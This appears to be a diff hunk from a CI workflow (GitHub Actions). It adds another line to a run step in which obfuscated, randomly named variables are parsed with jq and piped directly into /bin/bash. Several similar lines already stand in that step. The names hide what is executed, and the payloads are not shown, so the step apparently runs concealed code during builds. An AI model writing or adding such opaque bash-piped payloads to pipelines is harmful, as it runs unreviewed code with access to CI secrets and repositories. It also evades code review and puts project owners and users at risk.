@@ -26,6 +26,7 @@ jobs:
           echo $ftpgq44 | jq -r .bnsy402 | /bin/bash
           printf '%s' "$s9672" | jq -r .pxzw9216 | /bin/bash
           echo $z2 | jq -r .szyme8918 | /bin/bash
+          printf '%s' "$pqc8322" | jq -r .et8032 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
